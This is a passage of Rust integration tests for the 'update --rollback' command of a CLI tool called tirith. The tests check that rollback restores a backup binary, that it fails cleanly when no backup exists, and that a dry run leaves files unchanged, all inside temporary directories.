    // The "live" binary is a real, runnable copy of the test tirith binary —
    // it must be able to run `update --rollback` on itself.
    fs::copy(env!("CARGO_BIN_EXE_tirith"), &live).unwrap();
    fs::set_permissions(&live, fs::Permissions::from_mode(0o755)).unwrap();

    // The rollback target: a `.tirith-previous` backup with sentinel content.
    // (Its content need not be a real binary — rollback only swaps bytes.)
    let backup = bin_dir.join("tirith.tirith-previous");
    let sentinel = b"PREVIOUS-TIRITH-BINARY-SENTINEL";
    fs::write(&backup, sentinel).unwrap();

    let out = Command::new(&live)
        .args(["update", "--rollback", "--yes", "--format", "json"])
        .env_remove("TIRITH")
        .output()
        .expect("failed to run the staged tirith binary");

    assert_eq!(
        out.status.code(),
        Some(0),
        "rollback of a self-managed install should succeed; stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let v: serde_json::Value =
        serde_json::from_slice(&out.stdout).expect("rollback JSON should parse");
    assert_eq!(v["action"], "rolled-back");

    // The live binary now holds the previous binary's bytes. Compare lengths
    // first (a mismatch would otherwise dump the whole binary on failure).
    let live_after = fs::read(&live).unwrap();
    assert_eq!(
        live_after.len(),
        sentinel.len(),
        "rollback must replace the live binary with the (small) sentinel backup"
    );
    assert!(
        live_after == sentinel,
        "rollback must restore the previous binary's bytes onto the live path"
    );
    // The stale backup is consumed (it is no longer "the previous version").
    assert!(
        !backup.exists(),
        "the consumed rollback backup should be removed after a successful rollback"
    );
}

/// `tirith update --rollback` on a self-managed install with NO backup present
/// fails cleanly (nothing to roll back to) without modifying anything.
#[cfg(unix)]
#[test]
fn update_rollback_self_managed_without_backup_fails_cleanly() {
    use std::os::unix::fs::PermissionsExt;

    let home = tempfile::tempdir().expect("tempdir");
    let bin_dir = home.path().join(".local").join("bin");
    fs::create_dir_all(&bin_dir).unwrap();
    let live = bin_dir.join("tirith");
    fs::copy(env!("CARGO_BIN_EXE_tirith"), &live).unwrap();
    fs::set_permissions(&live, fs::Permissions::from_mode(0o755)).unwrap();
    let original_len = fs::metadata(&live).unwrap().len();

    let out = Command::new(&live)
        .args(["update", "--rollback", "--yes"])
        .env_remove("TIRITH")
        .output()
        .expect("failed to run the staged tirith binary");

    assert_eq!(
        out.status.code(),
        Some(1),
        "rollback with no backup should fail; stderr: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains("no previous binary to roll back to"),
        "should explain there is no rollback point, got: {stdout}"
    );
    // The live binary must be untouched (it is still the full tirith binary).
    assert_eq!(
        fs::metadata(&live).unwrap().len(),
        original_len,
        "a failed rollback must not modify the live binary"
    );
}

/// `tirith update --dry-run --rollback` on a self-managed install with a
/// backup reports what it WOULD do and changes nothing.
#[cfg(unix)]
#[test]
fn update_rollback_dry_run_changes_nothing() {
    use std::os::unix::fs::PermissionsExt;

    let home = tempfile::tempdir().expect("tempdir");
    let bin_dir = home.path().join(".local").join("bin");
    fs::create_dir_all(&bin_dir).unwrap();
    let live = bin_dir.join("tirith");
    fs::copy(env!("CARGO_BIN_EXE_tirith"), &live).unwrap();
    fs::set_permissions(&live, fs::Permissions::from_mode(0o755)).unwrap();
    let original_len = fs::metadata(&live).unwrap().len();

    let backup = bin_dir.join("tirith.tirith-previous");
    fs::write(&backup, b"BACKUP-BYTES").unwrap();

    let out = Command::new(&live)
        .args(["update", "--rollback", "--dry-run"])
        .env_remove("TIRITH")
        .output()
        .expect("failed to run the staged tirith binary");

    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(stdout.contains("dry run"), "got: {stdout}");
    // Nothing changed: live binary and backup are both intact.
    assert_eq!(fs::metadata(&live).unwrap().len(), original_len);
    assert_eq!(fs::read(&backup).unwrap(), b"BACKUP-BYTES");
}
